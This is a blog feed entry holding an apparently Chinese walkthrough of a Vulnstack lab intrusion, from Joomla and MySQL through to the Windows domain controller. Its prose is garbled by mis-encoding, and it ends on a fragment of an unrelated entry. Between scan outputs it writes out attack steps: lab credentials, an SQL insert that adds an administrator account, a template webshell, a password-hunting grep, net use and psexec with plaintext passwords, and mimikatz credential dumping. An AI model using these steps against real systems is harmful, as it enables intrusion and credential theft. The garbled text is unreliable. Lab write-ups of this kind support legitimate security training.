        <content type="html"><![CDATA[<blockquote><p>ä¸‹è½½åœ°å€ï¼š<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/5/">æ¼æ´è¯¦æƒ… (qiyuanxuetang.net)</a></p></blockquote><p>æ‰“å¼€è™šæ‹Ÿæœºé•œåƒä¸ºæŒ‚èµ·çŠ¶æ€ï¼Œç¬¬ä¸€æ—¶é—´è¿›è¡Œå¿«ç…§ï¼Œéƒ¨åˆ†æœåŠ¡æœªåšè‡ªå¯ï¼Œé‡å¯åæ— æ³•è‡ªåŠ¨è¿è¡Œã€‚</p><h1 id="ç½‘ç»œæ­å»º"><a href="#ç½‘ç»œæ­å»º" class="headerlink" title="ç½‘ç»œæ­å»º"></a>ç½‘ç»œæ­å»º</h1><p>VMnet2å’ŒVMnet3é…ç½®å¦‚å›¾æ‰€ç¤º<br><img src="/Rxi134_FILE/986298e29ccae5da90aa4f70ef4a1f12_MD5.jpeg"></p><p>ç„¶åå¯åŠ¨æ‰€æœ‰è™šæ‹Ÿæœºï¼Œå¹¶è®¾ç½®centosä¸€ä¸ªNATç½‘å¡ï¼ŒåŒæ—¶é‡å¯ç½‘ç»œæœåŠ¡</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> network restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é»‘ç›’æ¨¡å¼ï¼Œæ²¡æœ‰è´¦å¯†</p><h1 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h1><p>å…ˆæ‰«ç«¯å£</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 5.3 (protocol 2.0)| ssh-hostkey: |   1024 25:84:c6:cc:2c:8a:7b:8f:4a:7c:60:f1:a3:c9:b0:22 (DSA)|_  2048 58:d1:4c:59:2d:85:ae:07:69:24:0a:dd:72:0f:45:a5 (RSA)80/tcp   open  http    nginx 1.9.4|_http-title: Home|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA|_http-generator: Joomla! - Open Source Content Management| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: nginx/1.9.4| http-robots.txt: 15 disallowed entries | /joomla/administrator/ /administrator/ /bin/ /cache/ | /cli/ /components/ /includes/ /installation/ /language/ |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/3306/tcp open  mysql   MySQL 5.7.27-0ubuntu0.16.04.1| mysql-info: |   Protocol: 10|   Version: 5.7.27-0ubuntu0.16.04.1|   Thread ID: 13|   Capabilities flags: 63487|   Some Capabilities: IgnoreSpaceBeforeParenthesis, FoundRows, LongColumnFlag, ConnectWithDatabase, Speaks41ProtocolNew, Speaks41ProtocolOld, LongPassword, SupportsTransactions, ODBCClient, SupportsCompression, Support41Auth, InteractiveClient, DontAllowDatabaseTableColumn, IgnoreSigpipes, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults|   Status: Autocommit|   Salt: \x11L>y\x0F&#123;>JK\x1AE3i \x1F=U6\x01\x04|_  Auth Plugin Name: mysql_native_password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>22ç«¯å£ï¼šssh<br>80ç«¯å£ï¼šè¿™é‡Œæ‰«å‡ºæ¥ä¸€ä¸ª robots.txtï¼Œé‡Œé¢æ˜¯joomla cmsçš„ç›®å½•<br>3306ç«¯å£ï¼šmysql 5.7.27</p><p>gobyä¸Šå»æ‰“äº›å¸¸ç”¨pocï¼Œç›´æ¥ç»™æˆ‘æ‰«å‡ºä¸ªå¼±å£ä»¤ï¼Œ<code>root:123</code><br><img src="/Rxi134_FILE/78677d2143ef5d9c9634c796800f071e_MD5.jpeg"><br>å…ˆä¸æ€¥ç€åˆ©ç”¨ï¼Œå†æœé›†äº›ä¿¡æ¯</p><p>Joomla CMS<br><img src="/Rxi134_FILE/8f51a446c2a6450bf98a94f5984556d0_MD5.jpeg"></p><p>Joomlascanæ‰«å‡ºæ¥ä¸€äº›ç›®å½•ä¿¡æ¯ï¼ŒJoomla 3.9.12<br><img src="/Rxi134_FILE/2008ef20127c13f867bb5f0c6854e5d0_MD5.jpeg"></p><p>è¿™é‡Œæ³„éœ²äº†joomlaçš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«äº†æ•°æ®åº“å¯†ç å’Œç½‘ç«™ç»å¯¹è·¯å¾„<br><img src="/Rxi134_FILE/9511a58529b2dc8583373356f598d030_MD5.jpeg"><br><img src="/Rxi134_FILE/7d49600c2c611bd434de1e727f152f2d_MD5.jpeg"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token variable">$dbtype</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'mysqli'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'testuser'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cvcvgjASD!@'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'joomla'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$dbprefix</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'am2zu_'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$live_site</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'gXN9Wbpk7ef3A4Ys'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿œç¨‹è¿æ¥æ•°æ®åº“ï¼Œå…ˆæ‰¾æ‰¾æœ‰æ²¡æœ‰å¯ç”¨çš„ä¿¡æ¯ï¼Œåœ¨ä¸¤ä¸ªè¡¨é‡Œå­˜æ”¾äº†è´¦å¯†ä¿¡æ¯<br><img src="/Rxi134_FILE/b374998d36dab3a65144481d70d63367_MD5.jpeg"></p><p>æˆ‘ä»¬è¿™ä¸ªç”¨æˆ·æƒé™å¾ˆä½ï¼Œå‡ ä¹æ— æƒè¿›è¡Œä»»ä½•å†™æ“ä½œ<br><img src="/Rxi134_FILE/6059b9fba6afe41ea3719b42fb46155c_MD5.jpeg"></p><h1 id="å°è¯•æ•°æ®åº“å†™é©¬"><a href="#å°è¯•æ•°æ®åº“å†™é©¬" class="headerlink" title="å°è¯•æ•°æ®åº“å†™é©¬"></a>å°è¯•æ•°æ®åº“å†™é©¬</h1><p>å›åˆ°rootç”¨æˆ·ï¼Œç°åœ¨æœ‰ç½‘ç«™çš„ç»å¯¹è·¯å¾„ï¼Œinto oufileæ˜¯æ²¡æœ‰é™åˆ¶ï¼Œä½†æ˜¯ç½‘ç«™ç›®å½•æ— æƒå†™å…¥<br><img src="/Rxi134_FILE/92032314d1c8e5806e2c200151dd34f5_MD5.jpeg"></p><h1 id="å°è¯•ç ´è§£å“ˆå¸Œ"><a href="#å°è¯•ç ´è§£å“ˆå¸Œ" class="headerlink" title="å°è¯•ç ´è§£å“ˆå¸Œ"></a>å°è¯•ç ´è§£å“ˆå¸Œ</h1><pre class="line-numbers language-text" data-language="text"><code class="language-text">891Super Useradministratortest@test.com$2y$10$t1RelJijihpPhL8LARC9JuM/AWrVR.nto/XycrybdRbk8IEg6Dze2184Super Useradmintest@test.com$2y$10$N/Yv/9rzxyq.z0gLTT5og.pj3FFAP8Sq2PcBgsMX/Qnc2671qQkHy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>becryptï¼Œhashcatæ²¡çˆ†å‡ºæ¥</p><h1 id="å°è¯•æ·»åŠ æ–°ç”¨æˆ·"><a href="#å°è¯•æ·»åŠ æ–°ç”¨æˆ·" class="headerlink" title="å°è¯•æ·»åŠ æ–°ç”¨æˆ·"></a>å°è¯•æ·»åŠ æ–°ç”¨æˆ·</h1><p><img src="/Rxi134_FILE/ae2610f8d43a4f32cafab473d5459e67_MD5.jpeg"><br>æ·»åŠ äº†ä¸€ä¸ªç”¨æˆ·ï¼Œä½†è¿˜æ˜¯ç™»é™†å¤±è´¥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">INSERT INTO <span class="token variable"><span class="token variable">`</span>am2zu_users<span class="token variable">`</span></span>   <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>name<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>username<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>password<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>params<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>registerDate<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>lastvisitDate<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>lastResetTime<span class="token variable">`</span></span><span class="token punctuation">)</span>VALUES <span class="token punctuation">(</span><span class="token string">'Administrator2'</span>, <span class="token string">'admin2'</span>,    <span class="token string">'d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199'</span>, <span class="token string">''</span>, NOW<span class="token punctuation">(</span><span class="token punctuation">)</span>, NOW<span class="token punctuation">(</span><span class="token punctuation">)</span>, NOW<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>INSERT INTO <span class="token variable"><span class="token variable">`</span>am2zu_user_usergroup_map<span class="token variable">`</span></span> <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>user_id<span class="token variable">`</span></span>,<span class="token variable"><span class="token variable">`</span>group_id<span class="token variable">`</span></span><span class="token punctuation">)</span>VALUES <span class="token punctuation">(</span>LAST_INSERT_ID<span class="token punctuation">(</span><span class="token punctuation">)</span>,<span class="token string">'8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŠŠç®¡ç†å‘˜å¯†ç æ”¹æ‰å°±èƒ½ç™»ä¸Šäº†<br><img src="/Rxi134_FILE/146fb934f6679b623540b3006b2732fe_MD5.jpeg"><br><img src="/Rxi134_FILE/d4a5ab449597882bd67504629888279e_MD5.jpeg"></p><h1 id="Joomla-åå°ä¸»é¢˜å†™é©¬"><a href="#Joomla-åå°ä¸»é¢˜å†™é©¬" class="headerlink" title="Joomla!åå°ä¸»é¢˜å†™é©¬"></a>Joomla!åå°ä¸»é¢˜å†™é©¬</h1><p><img src="/Rxi134_FILE/6740098f1b6cc83b4bdd8c52d1b89792_MD5.jpeg"></p><p>ä»»æ„ç‚¹å‡»ä¸€ä¸ªä¸»é¢˜ï¼Œä¿®æ”¹æ¨¡æ¿ï¼Œè®¿é—®&#x2F;templates&#x2F;beez3&#x2F;error.phpå³å¯ï¼Œä¸Šçš„èšå‰‘</p><h2 id="disabled-functionç»•è¿‡"><a href="#disabled-functionç»•è¿‡" class="headerlink" title="disabled_functionç»•è¿‡"></a>disabled_functionç»•è¿‡</h2><p>æ”¶åˆ° disabled_function çš„é™åˆ¶<br><img src="/Rxi134_FILE/9c6a0ef4e19e9a0e0d430910129ee794_MD5.jpeg"></p><p>èšå‰‘æœ‰ä¸“é—¨çš„æ’ä»¶ï¼ŒPHP7_GC_UAFå¯ä»¥æˆåŠŸç»•è¿‡<br><img src="/Rxi134_FILE/3fc2dc2771fd7290096d71b82198b1ea_MD5.jpeg"></p><h1 id="æƒé™æå‡åˆ°ç”¨æˆ·"><a href="#æƒé™æå‡åˆ°ç”¨æˆ·" class="headerlink" title="æƒé™æå‡åˆ°ç”¨æˆ·"></a>æƒé™æå‡åˆ°ç”¨æˆ·</h1><p>å¼€äº†22ç«¯å£ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰id_rsa<br><img src="/Rxi134_FILE/92f8b5eead72a9227bdd38034f59d422_MD5.jpeg"><br>æ²¡æœ‰.sshæ–‡ä»¶å¤¹ï¼Œçœ‹æ¥ä¸è¡Œ</p><p>ä¸Šä¼ linpeasè¿›è¡Œä¸€æ³¢æ”¶é›†ï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆå¯ç”¨çš„æ”»å‡»é¢ï¼Œå€’æ˜¯å†…æ ¸ç‰ˆæœ¬å¾ˆä½ï¼Œå¯ä»¥ææƒ<br><img src="/Rxi134_FILE/adbec4c2b344b7caa56b72867a62b2b0_MD5.jpeg"></p><p>æ¨¡ç³ŠåŒ¹é…ä¸€äº›æ•æ„Ÿè¯ï¼Œæ¯”å¦‚passwordã€passwdã€passã€username</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-E</span> <span class="token string">'passwd*|password*'</span> /var/www/html /home/yy /tmp  <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/cd51a330c12b4b26c72a9d13cff7ffe2_MD5.jpeg"></p><p>åœ¨&#x2F;tmpä¸‹æ‰¾åˆ°å¯ç–‘è´¦å¯†<br><img src="/Rxi134_FILE/8f2484e2010dab9fb80f512537793802_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">adduser wwwuserpasswd wwwuser_123Aqx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ssh<br><img src="/Rxi134_FILE/734b925dfa65474c2bafd496dd89bc56_MD5.jpeg"></p><p>å†ä¸Šlinpeasè¿›è¡Œä¸€æ³¢æ”¶é›†ï¼Œè¿˜æ˜¯æ²¡ä»€ä¹ˆå¯ç”¨çš„</p><h1 id="93ç½‘æ®µæ¢æµ‹"><a href="#93ç½‘æ®µæ¢æµ‹" class="headerlink" title="93ç½‘æ®µæ¢æµ‹"></a>93ç½‘æ®µæ¢æµ‹</h1><p>å­˜åœ¨ä¸€ä¸ª 93 ç½‘æ®µ<br><img src="/Rxi134_FILE/40dfbfc534c50942d6723dda6a74e4ce_MD5.jpeg"></p><p>ä¸å¥½ä¸Šçº¿CSï¼Œè¿™é‡Œé€‰æ‹©ä¸Šçº¿msf<br><img src="/Rxi134_FILE/eab5ad07341f9718763f4f9d39ed346d_MD5.jpeg"></p><h2 id="fscanå†…ç½‘å¤§ä¿å¥"><a href="#fscanå†…ç½‘å¤§ä¿å¥" class="headerlink" title="fscanå†…ç½‘å¤§ä¿å¥"></a>fscanå†…ç½‘å¤§ä¿å¥</h2><p>ä¸Šä¼ fscan</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">start ping(icmp) Target 192.168.93.10   is alive(icmp) Target 192.168.93.20   is alive(icmp) Target 192.168.93.30   is alive(icmp) Target 192.168.93.100  is alive(icmp) Target 192.168.93.120  is alive[*] Icmp alive hosts len is: 5192.168.93.20:80 open192.168.93.30:135 open192.168.93.10:135 open192.168.93.20:135 open192.168.93.120:22 open192.168.93.100:80 open192.168.93.100:22 open192.168.93.30:445 open192.168.93.30:139 open192.168.93.100:3306 open192.168.93.20:1433 open192.168.93.120:3306 open192.168.93.10:139 open192.168.93.20:445 open192.168.93.20:139 open192.168.93.10:445 open192.168.93.120:80 open192.168.93.10:88 open[*] alive ports len is: 18start vulscan[*] NetInfo [*]192.168.93.30   [->]win7   [->]192.168.93.30[*] NetInfo [*]192.168.93.10   [->]WIN-8GA56TNV3MV   [->]192.168.93.10[*] NetBios 192.168.93.10   [+] DC:WIN-8GA56TNV3MV.test.org      Windows Server 2012 R2 Datacenter 9600[*] OsInfo 192.168.93.10(Windows Server 2012 R2 Datacenter 9600)[*] NetBios 192.168.93.20   win2008.test.org                    Windows Server (R) 2008 Datacenter 6003 Service Pack 2[*] NetInfo [*]192.168.93.20   [->]win2008   [->]192.168.93.20[*] OsInfo 192.168.93.30(Windows 7 Professional 7601 Service Pack 1)[*] WebTitle http://192.168.93.20      code:404 len:315    title:Not Found[*] OsInfo 192.168.93.20(Windows Server (R) 2008 Datacenter 6003 Service Pack 2)[+] mysql 192.168.93.100:3306:root 123[+] mysql 192.168.93.120:3306:root 123[*] WebTitle http://192.168.93.100     code:200 len:16020  title:Home[*] WebTitle http://192.168.93.120     code:200 len:16020  title:Homeå·²å®Œæˆ 16/18 [-] ssh 192.168.93.100:22 root 12345678 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain å·²å®Œæˆ 16/18 [-] ssh 192.168.93.100:22 root Aa12345. ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain å·²å®Œæˆ 16/18 [-] ssh 192.168.93.100:22 admin admin1 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain å·²å®Œæˆ 16/18 [-] ssh 192.168.93.120:22 admin a11111 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain å·²å®Œæˆ 18/18<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…ˆæ•´ç†ä¸€ä¸‹ï¼Œ93æ®µæœ‰å“ªäº›æœºå­</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">192.168.93.10 Windows Server 2012 R2192.168.93.20 win2008192.168.93.30 win7192.168.93.100 centos æˆ‘ä»¬æ‰€åœ¨çš„ä½ç½®192.168.93.120 linux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fscanæ‰«å‡ºä¸€ä¸ª mysql å¼±å£ä»¤ <code>root:123</code>ï¼Œæ˜¯120é‚£å°æœºå­</p><h1 id="ewæ­å»ºsocks5ä»£ç†"><a href="#ewæ­å»ºsocks5ä»£ç†" class="headerlink" title="ewæ­å»ºsocks5ä»£ç†"></a>ewæ­å»ºsocks5ä»£ç†</h1><p><img src="/Rxi134_FILE/014ea430e8b41de1c5787eb35353ce0d_MD5.jpeg"></p><p>å†åˆ©ç”¨proxfilerå®ç°å…¨å±€ä»£ç†<br><img src="/Rxi134_FILE/8570d52d14d969703d275a881a58b406_MD5.jpeg"></p><h1 id="120å¤‡ä»½æœåŠ¡å™¨"><a href="#120å¤‡ä»½æœåŠ¡å™¨" class="headerlink" title="120å¤‡ä»½æœåŠ¡å™¨"></a>120å¤‡ä»½æœåŠ¡å™¨</h1><p>navicatè¿æ¥ä¸Šæ•°æ®åº“<br><img src="/Rxi134_FILE/8c6124efb27613eb95e74468e7f28b90_MD5.jpeg"><br>æ•°æ®åº“å®Œå…¨ä¸€æ ·ï¼Œè¿™æœ‰å¯èƒ½æ˜¯ä¸ªå¤‡ä»½æœåŠ¡å™¨<br><img src="/Rxi134_FILE/d80b26776f729e5e972fb3da354c3d06_MD5.jpeg"></p><p>å°è¯•ç”¨centosçš„å¯†ç sshä¸Šå»ï¼Œè¢«æ‹’ç»ï¼Œç…§ç€åŸæ¥çš„å†™é©¬å°±è¡Œï¼Œè¿™é‡Œå°±ä¸å†é‡å¤äº†</p><h1 id="åŸŸæ¸—é€"><a href="#åŸŸæ¸—é€" class="headerlink" title="åŸŸæ¸—é€"></a>åŸŸæ¸—é€</h1><h2 id="å°è¯•æ°¸æ’ä¹‹è“"><a href="#å°è¯•æ°¸æ’ä¹‹è“" class="headerlink" title="å°è¯•æ°¸æ’ä¹‹è“"></a>å°è¯•æ°¸æ’ä¹‹è“</h2><p>è¿™ä¸‰ä¸ªwindowsæœºå™¨éƒ½å¼€äº†445ï¼Œç»™msfåŠ ä¸€æ®µsessionè·¯ç”±ï¼Œæ‰«è¿™ä¸‰ä¸ªwindowsæœºå™¨<br><img src="/Rxi134_FILE/99886acb32e07f00ecc70b94fe1ed86f_MD5.jpeg"><br><img src="/Rxi134_FILE/0cafa142dcd00f1f7fd4d90e1f4e8f14_MD5.jpeg"><br>å•¥éƒ½æ²¡æœ‰</p><h2 id="ä¿¡æ¯æœé›†-1"><a href="#ä¿¡æ¯æœé›†-1" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><ul><li><p>10æœºå™¨ - Windows Server 2012 R2</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE SERVICE    VERSION25/tcp    open  tcpwrapped|_smtp-commands: Couldn't establish connection on port 2553/tcp    open  tcpwrapped88/tcp    open  tcpwrapped110/tcp   open  tcpwrapped135/tcp   open  tcpwrapped139/tcp   open  tcpwrapped389/tcp   open  tcpwrapped445/tcp   open  tcpwrapped Windows Server 2012 R2 Datacenter 9600 tcpwrapped464/tcp   open  tcpwrapped593/tcp   open  tcpwrapped636/tcp   open  tcpwrapped3268/tcp  open  tcpwrapped3269/tcp  open  tcpwrapped49155/tcp open  tcpwrapped49157/tcp open  tcpwrapped49158/tcp open  tcpwrapped49159/tcp open  tcpwrapped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>20æœºå™¨ - win2008</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE SERVICE      VERSION25/tcp    open  tcpwrapped|_smtp-commands: Couldn't establish connection on port 2580/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found110/tcp   open  tcpwrapped135/tcp   open  msrpc        Microsoft Windows RPC139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn445/tcp   open  microsoft-ds Windows Server (R) 2008 Datacenter 6003 Service Pack 2 microsoft-ds (workgroup: TEST)1433/tcp  open  ms-sql-s     Microsoft SQL Server 2008 10.00.1600.00; RTM| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Issuer: commonName=SSL_Self_Signed_Fallback| Public Key type: rsa| Public Key bits: 1024| Signature Algorithm: sha1WithRSAEncryption| Not valid before: 2019-12-15T05:29:23| Not valid after:  2049-12-15T05:29:23| MD5:   53e9:ab09:d053:84ac:5740:c08b:c93a:e843|_SHA-1: a6a9:c4bd:6d50:a57c:0bec:ad38:5766:7032:0965:33e6|_ssl-date: 2024-10-04T11:53:59+00:00; 0s from scanner time.| ms-sql-ntlm-info:|   192.168.93.20\MSSQLSERVER:|     Target_Name: TEST|     NetBIOS_Domain_Name: TEST|     NetBIOS_Computer_Name: WIN2008|     DNS_Domain_Name: test.org|     DNS_Computer_Name: win2008.test.org|     DNS_Tree_Name: test.org|_    Product_Version: 6.0.6003| ms-sql-info:|   192.168.93.20\MSSQLSERVER:|     Instance name: MSSQLSERVER|     Version:|       name: Microsoft SQL Server 2008 RTM|       number: 10.00.1600.00|       Product: Microsoft SQL Server 2008|       Service pack level: RTM|       Post-SP patches applied: false|     TCP port: 1433|_    Clustered: false2383/tcp  open  ms-olap4?49152/tcp open  msrpc        Microsoft Windows RPC49153/tcp open  msrpc        Microsoft Windows RPC49154/tcp open  msrpc        Microsoft Windows RPC49155/tcp open  msrpc        Microsoft Windows RPC49156/tcp open  msrpc        Microsoft Windows RPC49158/tcp open  msrpc        Microsoft Windows RPC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>30æœºå™¨ - win7</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE SERVICE25/tcp    open  smtp110/tcp   open  pop3135/tcp   open  msrpc139/tcp   open  netbios-ssn445/tcp   open  microsoft-ds49152/tcp open  unknown49153/tcp open  unknown49154/tcp open  unknown49155/tcp open  unknown49163/tcp open  unknown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>å­˜åœ¨åŸŸ test.org</p><p>è¿™é‡Œæˆ‘è¿˜è¯•ç€çœ‹çœ‹smbæœ‰æ²¡æœ‰åŒ¿åç™»å½•ï¼Œä¸è¿‡éƒ½ä¸è¡Œ</p><h2 id="smbå¼±å£ä»¤çˆ†ç ´"><a href="#smbå¼±å£ä»¤çˆ†ç ´" class="headerlink" title="smbå¼±å£ä»¤çˆ†ç ´"></a>smbå¼±å£ä»¤çˆ†ç ´</h2><p>çœ‹wpè¯´æ˜¯win7å’Œwin2008çš„SMBæ˜¯å¼±å£ä»¤<code>administrator:123qwe!ASD</code></p><p>æˆ‘å°±æ‡’å¾—çˆ†äº†ï¼Œç›´æ¥ç”¨</p><h2 id="psexec-æ‹¿ä¸‹win7ã€win2008"><a href="#psexec-æ‹¿ä¸‹win7ã€win2008" class="headerlink" title="psexec æ‹¿ä¸‹win7ã€win2008"></a>psexec æ‹¿ä¸‹win7ã€win2008</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">administrator:123qwe!ASD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŒ‚è½½Cç›˜</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net use Z: <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.93.30<span class="token punctuation">\</span>c$ /user:administrator 123qwe<span class="token operator">!</span>ASD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/923db79b42190219ed5eaeaaa4807ee1_MD5.jpeg"></p><p>åˆ©ç”¨pstoolsè¿œç¨‹è¿æ¥åˆ°win7<br><img src="/Rxi134_FILE/43021cdda9beb03742dba4fc11c39e22_MD5.jpeg"></p><p>åˆ©ç”¨pstoolsè¿œç¨‹è¿æ¥åˆ°win2008ï¼Œä½†æ˜¯ä½¿ç”¨pstoolsæ˜¯å¤±è´¥çš„ï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼Œä½¿ç”¨msfæˆåŠŸäº†<br><img src="/Rxi134_FILE/b28d4365efa7d86fe1aa9559802139bf_MD5.jpeg"><br><img src="/Rxi134_FILE/e8747a6b72a98571d26cce60f992ee20_MD5.jpeg"></p><p><img src="/Rxi134_FILE/cd1a543929d7096b0f50fab14f6a4357_MD5.jpeg"></p><h2 id="mimikatzæŠ“å–å¯†ç "><a href="#mimikatzæŠ“å–å¯†ç " class="headerlink" title="mimikatzæŠ“å–å¯†ç "></a>mimikatzæŠ“å–å¯†ç </h2><p>win7ï¼šç›´æ¥ä¸Šä¼ mimikatzï¼Œæ²¡æŠ“åˆ°åŸŸç”¨æˆ·<br><img src="/Rxi134_FILE/e9d18372c2df207195eab95b63d653fc_MD5.jpeg"></p><p>win2008ï¼šmeterpreterè‡ªå¸¦kiwiæ¨¡å—ï¼Œå¯¼å…¥åæŠ“å–å¯†ç ï¼Œå¾—åˆ°åŸŸæ§<code>Administrator:zxcASDqw123!!</code><br><img src="/Rxi134_FILE/ef253f78bf8f604afc9a0a0e1ce7c93c_MD5.jpeg"></p><h2 id="ç™»å½•åŸŸæ§"><a href="#ç™»å½•åŸŸæ§" class="headerlink" title="ç™»å½•åŸŸæ§"></a>ç™»å½•åŸŸæ§</h2><p><img src="/Rxi134_FILE/e6307a2bba195460de3771908d80f6bf_MD5.jpeg"><br><img src="/Rxi134_FILE/350745b6490ea82aff33c210c8763305_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> è¿›æ”»æ€§æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnstacké¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8.Portable Executable Format å¯ç§»æ¤å¯æ‰§è¡Œæ ¼å¼</title>
      <link href="/2024/10/05/8.Portable%20Executable%20Format%20%E5%8F%AF%E7%A7%BB%E6%A4%8D%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%A0%BC%E5%BC%8F/"/>
      <url>/2024/10/05/8.Portable%20Executable%20Format%20%E5%8F%AF%E7%A7%BB%E6%A4%8D%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%A0%BC%E5%BC%8F/</url>
      
